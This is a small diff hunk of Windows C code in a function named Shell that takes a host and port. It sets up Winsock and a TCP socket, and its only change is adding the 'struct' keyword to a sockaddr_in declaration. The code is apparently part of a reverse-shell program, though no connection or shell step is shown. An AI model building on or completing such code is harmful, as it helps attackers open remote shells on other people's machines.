@@ -15,7 +15,7 @@ int Shell(char* host, int port){
         Sleep(5000);
         printf("[+] Starting Connection\n");
         SOCKET mySock;
-        sockaddr_in saddr;
+        struct sockaddr_in saddr;
         WSADATA version;
         WSAStartup(MAKEWORD(2,2), &version);
         mySock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL, (unsigned int)NULL, (unsigned int)NULL);
